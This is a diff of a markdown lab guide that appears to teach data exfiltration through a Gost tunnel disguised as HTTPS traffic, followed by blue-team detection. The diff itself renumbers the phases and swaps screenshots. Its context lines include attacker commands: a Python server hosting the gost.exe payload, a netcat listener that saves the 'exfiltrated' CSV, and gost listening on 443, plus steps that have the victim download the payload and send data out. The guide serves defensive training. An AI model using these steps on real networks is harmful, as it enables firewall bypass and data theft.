@@ -78,7 +78,6 @@ As an attacker, you already have your tools pre-staged on your server. We need t
 > We will use **3 Ubuntu Terminals**, which may take up a lot of space on your screens. You should *resize* the different terminals, such that they take up as little space as possible.  
 
 
-
 - *Terminal 1:* - In the terminal you just opened, move to the **Lab Directory** and start a quick Python web server to host the Windows payload (gost.exe) so the victim machine can download it. Minimize it afterwards:
 
 ```bash
@@ -95,7 +94,8 @@ python3 -m http.server 8001
 cd ~/BnB/GostLab
 nc -lvnp 8080 > exfiltrated_data.csv
 ```
-<img width="765" height="146" alt="image" src="https://github.com/user-attachments/assets/4776caec-91d8-43ae-aea3-bdd7eee2f091" />
+
+<img width="569" height="92" alt="image" src="https://github.com/user-attachments/assets/258f9049-1472-4ca9-b1a4-ffa0598a9ae4" />
 
 
 - *Terminal 3:* Open up another *Ubuntu Shell*, navigate to the **Lab Directory** and start Gost to listen on port 443 (simulating standard HTTPS traffic) and forward that traffic internally to our Netcat listener. **(Note down your Ubuntu VM IP address before running this, you will need it later)**. Minimize this window too.
@@ -117,7 +117,7 @@ sudo ./gost -L wss://:443
 
 ---
 
-### Phase 2: Payload Delivery & Exfiltration
+### Phase 3: Payload Delivery & Exfiltration
 Now we switch to the compromised Windows machine. We need to download the tunneling tool (Living off the Land) and extract the sensitive data.
 
 - Download the Gost payload directly from our Ubuntu server into a temporary folder. **Make sure to replace <UBUNTU_IP> with your actual Ubuntu IP address.**
@@ -150,11 +150,11 @@ Write-Host "Exfil Complete!" -ForegroundColor Green
 
 You will now see a **Connection recieved** message in the Ubuntu Terminal.
 
-<img width="810" height="73" alt="image" src="https://github.com/user-attachments/assets/277bece3-3bab-469b-bbd7-9724583009dd" />
+<img width="805" height="307" alt="image" src="https://github.com/user-attachments/assets/a0045e4b-f4f0-48f5-9ab0-345d24c91110" />
 
 ---
 
-### Phase 3: Verification (Ubuntu VM)
+### Phase 4: Verification (Ubuntu VM)
 Let's see if the firewall was bypassed successfully.
 
 - Go back to your Ubuntu VM, specifically to *Terminal 2* (where Netcat was running). The listener should automatically stop once the information is recieved. When it does, read the stolen data.
@@ -162,11 +162,11 @@ Let's see if the firewall was bypassed successfully.
 ```bash
 cat exfiltrated_data.csv
 ```
-<img width="928" height="285" alt="image" src="https://github.com/user-attachments/assets/5f332435-1b43-473a-9196-1a2cc9aba0a9" />
+<img width="849" height="143" alt="image" src="https://github.com/user-attachments/assets/d2666a18-f713-440a-b03c-651013dc0f07" />
 
 ---
 
-### Phase 4: Blue Team Detection (Windows VM)
+### Phase 5: Blue Team Detection (Windows VM)
 Why didn't the enterprise firewall block this? Because the traffic looked like a normal encrypted web connection (HTTPS/443). How can we detect it as defenders?
 
 - Switch back to the Windows VM. Look for suspicious persistent connections. Although the traffic is encrypted, the process maintaining the connection is anomalous. 
